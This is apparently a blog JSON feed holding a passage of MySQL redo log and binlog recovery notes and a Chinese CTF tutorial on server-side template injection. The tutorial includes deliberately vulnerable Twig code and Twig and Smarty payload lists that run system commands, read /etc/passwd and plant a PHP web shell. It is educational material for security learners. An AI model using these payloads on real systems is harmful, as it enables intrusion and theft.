redo log file采用追加 写的方式</span><br><span class=\"line\"></span><br><span class=\"line\">第4步：定期将内存中修改的数据刷新到磁盘中</span><br></pre></td></tr></table></figure>\n<p><strong>注意，redo log buffer 刷盘到 redo log file 的过程并不是真正的刷到磁盘中去，只是刷入到文件系统缓存（page cache）中去（这是现代操作系统为了提高文件写入效率做的一个优化</strong>）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201143107759.png\" alt=\"image-20221201143107759\"></p>\n<p>真正的写入会交给系统自己来决定（比如 page cache 足够大了）。那么对于 InnoDB 来说就存在一个问题，如果交给系统来同步，同样如果系统宕机，那么数据也丢失了</p>\n<p>InnoDB 给出 innodb_flush_log_at_trx_commit 参数，该参数控制 commit 提交事务时，如何将 redo log buffer 中的日志刷新到 redo log file 中。它支持三种策略：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">设置为0 ：表示每次事务提交时不进行刷盘操作。（系统默认master thread每隔1s进行一次重做日志的同步）</span><br><span class=\"line\"></span><br><span class=\"line\">设置为1 ：表示每次事务提交时都将进行同步，刷盘操作（ 默认值 ）</span><br><span class=\"line\"></span><br><span class=\"line\">设置为2 ：表示每次事务提交时都只把 redo log buffer 内容写入 page cache，不进行同步。由os自己决定什么时候同步到磁盘文件。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1be6cdfbf3f54bd8ac637ac73d45caed.png\" alt=\"\"></p>\n<p>=0 系统崩溃会丢失一秒数据</p>\n<p>=2 在极端环境下会丢失一秒数据，只写入内存</p>\n<p>&lt;=5.5MyISAM 不支持 redolog</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/57decf7a3f214140bb3829fac1e849ac.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/dd905e10eb73483bbfe327c4e70a5ecd.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/8f6087b82bc64e788d2f00ae6438291f.png\" alt=\"\"></p>\n<p>redo log crash safe writepos checkpoint</p>\n<p>binlog 和 redolog 差异</p>\n<p>在记录 1 刷盘后，记录 2 未刷盘时，数据库 crash。重启后，只通过 binlog 数据库无法判断这两条记录哪条已经写入磁盘哪条没有写入磁盘，不管是两条都恢复至内存，还是都不恢复，对 ID=2 这行数据来说，都不对。</p>\n<p>通过插入大量数据可以查看三种刷盘策略的不同</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(root@localhost) [hellodb]&gt; call sp_testlog;</span><br><span class=\"line\">Query OK, 1 row affected (45.36 sec) #用时45秒</span><br><span class=\"line\"></span><br><span class=\"line\">(root@localhost) [hellodb]&gt; begin;call sp_testlog;commit;</span><br><span class=\"line\">#我们看到将存储过程call sp_testlog作为一个事务来说，其内部的十万条insert合起来一个事务的所有操作。</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\">Query OK, 1 row affected (4.01 sec)</span><br><span class=\"line\">Query OK, 0 rows affected (0.49 sec)</span><br></pre></td></tr></table></figure>\n<p>备份</p>\n<p>差异备份 - 和完全备份有多少区别就备份多少</p>\n<p>全量备份</p>\n<p>增量备份</p>\n<p>mysqldump -uroot -p123  test &gt; /tmp/bak.sql</p>\n<p>mysqldump -uroot -p123 --databases test test1 &gt; /tmp/bak.sql</p>\n<p>xtrabackup</p>\n<h2 id=\"binlog\"><a class=\"markdownIt-Anchor\" href=\"#binlog\">#</a> binlog</h2>\n<p>Binlog 用于对还没没备份的数据进行恢复。它记录了所有的 DDL (create alter drop) 和 DML 语句（除了数据查询语句 select），以事件形式记录，还包含语句所执行的消耗的时间，MySQL 的二进制日志是事务安全型的。</p>\n<p>mysqlbinlog 常见的选项有以下几个：<br>\n–start-datetime：从二进制日志中读取指定等于时间戳或者晚于本地服务器的时间<br>\n–stop-datetime：从二进制日志中读取指定小于时间戳或者等于本地服务器的时间 取值和上述一样<br>\n–start-position：从二进制日志中读取指定 position 事件位置作为开始。<br>\n–stop-position：从二进制日志中读取指定 position 事件位置作为事件截至</p>\n<p>binlog 日志有两个最重要的使用场景<br>\n 1）MySQL 主从复制：MySQL Replication 在 Master 端开启 binlog，Master 把它的二进制日志传递给 slaves 来达到<br>\n master-slave 数据一致的目的。<br>\n2）自然就是数据恢复了，通过使用 mysqlbinlog 工具来使恢复数据。</p>\n<p>binlog 日志包括两类文件<br>\n 1）二进制日志索引文件（文件名后缀为.index）用于记录所有的二进制文件<br>\n 2）二进制日志文件（文件名后缀为.00000*）记录数据库所有的 DDL 和 DML (除了数据查询语句 select) 语句事件。</p>\n<p>开启：在配置文件中加入以下内容</p>\n<p>[root@vm-002 ~]# vim /etc/my.cnf</p>\n<p>log_bin = mysql_bin   // 给 binlog 日志取名，并开启 binlog</p>\n<p>每次服务器（数据库）重启，服务器会调用 flush logs;，新创建一个 binlog 日志！</p>\n<p>flush logs; flush 刷新 log 日志，自此刻开始产生一个新编号的 binlog 日志文件</p>\n<p>使用 mysqlbinlog 自带查看命令法：</p>\n<p>–&gt;binlog 是二进制文件，普通文件查看器 cat、more、vim 等都无法打开，必须使用自带的 mysqlbinlog 命令查看</p>\n<p>–&gt;binlog 日志与数据库文件在同目录中</p>\n<p>–&gt; 在 MySQL5.5 以下版本使用 mysqlbinlog 命令时如果报错，就加上 “–no-defaults” 选项</p>\n<p>binlog_format 修改该变量</p>\n<p>二进制日志有 3 种记录方式，三种方式如下：</p>\n<p>statement 模式：记录对数据库做出修改的语句，比如，update A set test=’test’, 如果使用 statement 模式，那么这条 update 语句将会被记录到二进制日志中，使用 statement 模式时，优点是 binlog 日志量少，IO 压力小，性能较高，缺点是为了能够尽量的完全一致的还原操作，除了记录语句本身以外，可能还需要记录一些相关的信息，而且，在使用一些特定的函数时，并不能保证恢复操作与记录时完全一致。</p>\n<p>row 模式：记录对数据库做出修改的语句所影响到的数据行以及这些行的修改，比如，update A set test=’test’，如果使用 row 模式，那么这条 update 语句所影响到的行所对应的修改，将会记录到 binlog 中，比如，A 表中有 1000 条数据，那么当执行这条 update 语句以后，由于 1000 条数据都会被修改，所以会有 1000 行数据被记录到二进制日志中，以及它们是怎样被修改的，使用 row 模式时，优点是能够完全的还原或者复制日志被记录时的操作，缺点是记录日志量较大，IO 压力大，性能消耗较大。</p>\n<p>mixed 模式：混合使用上述两种模式，一般的语句使用 statment 方式进行保存，如果遇到一些特殊的函数，则使用 row 模式进行记录，这种记录方式被称之为 mixed，看上去这种方式似乎比较美好，但是在生产环境中，为了保险起见，一般会使用 row 模式。</p>\n<p>DDL - create alter  drop</p>\n<p>DML - update，insert，delete</p>\n<p>show master log    // 查看最新生成 binlog</p>\n<p>show binlog events in ‘mysqlbin.0000001’   // 以位置方式查看 binlog</p>\n<p>mysqlbinlog mysqlbin.0000001  // 以时间方式查看 binlog</p>\n<p>​</p>\n<p>mysqlbinlog mysqllog000003 &gt; 00003.sql</p>\n<p>vim 00003.sql    查看 binlog 信息</p>\n<p>mysql -uroot -p123456 &lt; 00003.sql   恢复 binlog</p>\n<p>flush log   刷新创建新 binlog</p>\n<p>基于位置信息恢复</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysqlbinlog --start-position=660 --stop-position=773 --database=haha mysqlbin.00003 | mysql -uroot -p123456 -v</span><br></pre></td></tr></table></figure>\n<p>基于时间信息恢复</p>\n<p>[root@vm-002 backup]# cp /var/lib/mysql/mysql-bin.000003 /opt/backup<br>\n[root@vm-002 backup]# mysqlbinlog /opt/backup/mysql-bin.000003 &gt; /opt/backup/000003.sql<br>\n [root@vm-002 backup]# vim /opt/backup/000003.sql #删除里面的 drop 语句<br>\n [root@vm-002 backup]# mysql -uroot -p -v &lt; /opt/backup/000003.sql</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/12/27/SSTI/",
            "url": "http://example.com/2022/12/27/SSTI/",
            "title": "SSTI",
            "date_published": "2022-12-27T05:38:45.000Z",
            "content_html": "<h1 id=\"ssti\"><a class=\"markdownIt-Anchor\" href=\"#ssti\">#</a> SSTI</h1>\n<p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>\n<p>SSTI 是 CTF 的常客，在 PHP，java，python，甚至 go 中都存在 ssti，为了不再做爆零小笨蛋，本文准备结合 ctf+cms 深入了解一下 ssti</p>\n<h2 id=\"模板引擎\"><a class=\"markdownIt-Anchor\" href=\"#模板引擎\">#</a> 模板引擎</h2>\n<p>模板引擎（这里特指用于 Web 开发的模板引擎）是为了<strong>使用户界面与业务数据（内容）分离而产生的</strong>，它可以生成特定格式的文档，利用模板引擎来生成前端的 html 代码，模板引擎会提供一套生成 html 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板 + 用户数据的前端 html 页面，然后反馈给浏览器，呈现在用户面前。</p>\n<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>\n<p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的 HTML 字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>\n<p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是 json 等数据包封装的数据，也可能是 html 代码，他都是由浏览器前端来解析渲染成 html 的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>\n<h2 id=\"ssti-模板注入\"><a class=\"markdownIt-Anchor\" href=\"#ssti-模板注入\">#</a> SSTI 模板注入</h2>\n<p>当前使用的一些框架，比如 python 的 flask，php 的 tp，java 的 spring 等一般都采用成熟的的 MVC 的模式，用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户。因此 SSTI 存在于 MVC 模式当中的 View 层。</p>\n<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>\n<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200911174631687-758048107.png\" alt=\"img\"></p>\n<p>其实 ctf 多做做就会发现最几年的出题趋势</p>\n<p>18，19 年 php 和 python ssti，一直到 2022 年的 go ssti</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203100847401.png\" alt=\"image-20221203100847401\"></p>\n<p>区别模板</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221202175327246.png\" alt=\"image-20221202175327246\"></p>\n<p>攻击 payload 构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">毕竟渗透测试，对于所有渗透测试也都是适用的。</span><br><span class=\"line\">先从探测漏洞 --&gt; 证明存在该漏洞 --&gt; 漏洞的进一步利用</span><br></pre></td></tr></table></figure>\n<p>模板引擎会自动执行数学运算，所以如果我们输入一个运算，例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://111.com/?username=$&#123;7*7&#125;</span><br></pre></td></tr></table></figure>\n<p>如果模板引擎最后返回 Hello 49 则说明存在 SSTI 漏洞。</p>\n<h2 id=\"php\"><a class=\"markdownIt-Anchor\" href=\"#php\">#</a> PHP</h2>\n<h3 id=\"twig\"><a class=\"markdownIt-Anchor\" href=\"#twig\">#</a> twig</h3>\n<p>Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">　　require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;;</span><br><span class=\"line\">　　Twig_Autoloader::register(true);</span><br><span class=\"line\">　　$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class=\"line\">　　$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值</span><br><span class=\"line\">　　echo $output;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>Twig 使用一个加载器 loader (Twig_Loader_Array) 来定位模板，以及一个环境变量 environment (Twig_Environment) 来存储配置信息。</p>\n<p>其中，render () 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>\n<p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET [“name”] 。</p>\n<p>也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200815170919414-672456065.png\" alt=\"img\"></p>\n<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">　　require_once dirname(__FILE__).&#x27;/../lib/Twig/Autoloader.php&#x27;;</span><br><span class=\"line\">　　Twig_Autoloader::register(true);</span><br><span class=\"line\">　　$twig=newTwig_Environment(newTwig_Loader_String());</span><br><span class=\"line\">　　$output=$twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;);// 将用户输入作为模版内容的一部分</span><br><span class=\"line\">　　echo $output;?&gt;</span><br></pre></td></tr></table></figure>\n<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>\n<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p>\n<p>在 Twig 模板引擎里，， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>\n<p>例如这里用户输入 name=20 ，则在服务端拼接的模版内容为:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200815171519739-387170199.png\" alt=\"img\"></p>\n<p>以上使用的 twig 为 2.x 版本，现在官方已经更新到 3.x 版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class=\"line\">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class=\"line\">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"smarty\"><a class=\"markdownIt-Anchor\" href=\"#smarty\">#</a> smarty</h3>\n<p>Smarty 是最流行的 PHP 模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数 (相当于存在了一个 disable_function)</p>\n<p>$smarty 内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>\n<p>注入点：</p>\n<ul>\n<li>XFF</li>\n<li>Client IP</li>\n</ul>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br><span class=\"line\">&#123;php&#125;phpinfo();&#123;/php&#125;  #执行相应的php代码,在Smarty3版本中已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span><br><span class=\"line\">&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;    #&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt; ,只适用于php5,原理是&#123;literal&#125;标签</span><br><span class=\"line\">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;  #在3.1.30的Smarty版本中官方已经把该静态方法删除</span><br><span class=\"line\">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"python\"><a class=\"markdownIt-Anchor\" href=\"#python\">#</a> python</h2>\n<h3 id=\"flaskjinja2\"><a class=\"markdownIt-Anchor\" href=\"#flaskjinja2\">#</a> Flask&amp;jinja2</h3>\n<p>这里先补充一些 flask 的知识</p>\n<p>我们有如下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&quot;/&quot;)</span><br><span class=\"line\">def hello_world():</span><br><span class=\"line\">    return &quot;hello world&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<p>如果没有 flask 报错就自己去 pip3 install</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203102807012.png\" alt=\"image-20221203102807012\"></p>\n<p>此时可以在 web 上运行 hello world 了，访问<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMTo1MDAwLw==\"> http://127.0.0.1:5000</span> 便可以看到打印出 Hello World</p>\n<h4 id=\"route\"><a class=\"markdownIt-Anchor\" href=\"#route\">#</a> route</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>\n<p>使用 route（）装饰器告诉 Flask 什么样的 URL 能触发我们的函数</p>\n<p>route（）装饰器把一个函数绑定到对应的 URL 上，这句话相当于路由，一个路由跟随一个函数，如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;)</span><br><span class=\"line\">def test()&quot;</span><br><span class=\"line\">   return 123</span><br></pre></td></tr></table></figure>\n<p>访问 127.0.0.1:5000 / 则会输出 123，我们修改一下规则</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/test&#x27;)</span><br><span class=\"line\">def test()&quot;</span><br><span class=\"line\">   return 123</span><br></pre></td></tr></table></figure>\n<p>这个时候访问 127.0.0.1:5000/test 会输出 123.</p>\n<p>此外还可以设置动态网址，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&quot;/hello/&lt;username&gt;&quot;)</span><br><span class=\"line\">def hello_user(username):</span><br><span class=\"line\">  return &quot;user:%s&quot;%username</span><br></pre></td></tr></table></figure>\n<p>根据 url 里的输入，动态辨别身份，此时便可以看到如下页面：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203103046869.png\" alt=\"image-20221203103046869\"></p>\n<p>或者可以使用 int 型，转换器有下面几种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int    接受整数</span><br><span class=\"line\">float    同 int ，但是接受浮点数</span><br><span class=\"line\">path    和默认的相似，但也接受斜线</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/post/&lt;int:post_id&gt;&#x27;)</span><br><span class=\"line\">def show_post(post_id):</span><br><span class=\"line\">    # show the post with the given id, the id is an integer</span><br><span class=\"line\">    return &#x27;Post %d&#x27; % post_id</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.run(debug=True)</span><br></pre></td></tr></table></figure>\n<p>这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加 debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>\n<p>这会让操作系统监听所有公网 IP, 此时便可以在公网上看到自己的 web。</p>\n<h4 id=\"模板渲染\"><a class=\"markdownIt-Anchor\" href=\"#模板渲染\">#</a> 模板渲染</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import render_template</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/hello/&#x27;)</span><br><span class=\"line\">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class=\"line\">def hello(name=None):</span><br><span class=\"line\">        return render_template(&#x27;hello.html&#x27;, name=name)//我们hello.html模板未创建所以</span><br></pre></td></tr></table></figure>\n<p>模板渲染体系，render_template 函数渲染的是 templates 中的模板，所谓模板是我们自己写的 html，里面的参数需要我们根据每个用户需求传入动态变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── app.py  </span><br><span class=\"line\">├── static  </span><br><span class=\"line\">│   └── style.css  </span><br><span class=\"line\">└── templates  </span><br><span class=\"line\">    └── index.html</span><br></pre></td></tr></table></figure>\n<p>我们写一个 index.html 文件写 templates 文件夹中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;&#123;&#123;title&#125;&#125; - 小猪佩奇&lt;/title&gt;</span><br><span class=\"line\">  &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">      &lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;/h1&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>我们在 app.py 文件里进行渲染。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;)</span><br><span class=\"line\">@app.route(&#x27;/index&#x27;)#我们访问/或者/index都会跳转</span><br><span class=\"line\">def index():</span><br><span class=\"line\">   user = &#123;&#x27;name&#x27;: &#x27;小猪佩奇&#x27;&#125;#传入一个字典数组</span><br><span class=\"line\">   return render_template(&quot;index.html&quot;,title=&#x27;Home&#x27;,user=user)</span><br></pre></td></tr></table></figure>\n<p>这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成 SSTI 模板注入漏洞。</p>\n<p>渲染的方法有 <code>render_template</code>  和 <code>render_template_string</code>  两种。</p>\n<p>render_template () 是用来渲染一个指定的文件的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>render_template_string 则是用来渲染一个字符串的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">html = <span class=\"string\">&#x27;&lt;h1&gt;This is index page&lt;/h1&gt;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>\n<h4 id=\"flaskjinja2模板注入\"><a class=\"markdownIt-Anchor\" href=\"#flaskjinja2模板注入\">#</a> Flask/jinja2 模板注入</h4>\n<p>Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 <code>&#123;&#123;…&#125;&#125;</code>  块</p>\n<p>Jinja2 使用 <code> &#123;&#123;name&#125;&#125;</code>  结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>\n<p>Jinja2 模板同样支持控制语句，像在  <code>&#123;%…%&#125;</code>  块中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span 